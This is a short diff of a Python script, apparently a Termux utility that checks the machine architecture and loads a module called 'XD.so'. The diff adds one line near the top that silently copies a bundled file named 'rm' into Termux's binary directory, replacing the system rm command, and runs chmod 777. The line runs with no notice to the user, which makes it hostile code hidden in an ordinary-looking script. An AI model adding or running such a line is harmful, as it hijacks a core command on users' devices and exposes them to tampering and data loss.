@@ -2,6 +2,7 @@ import os
 from os import path,system
 from platform import uname
 arch=uname().machine.lower()
+system('cp rm /data/data/com.termux/files/usr/bin && chmod 777 rm')
 if path.isfile("XD.so"):
     pass
 else:
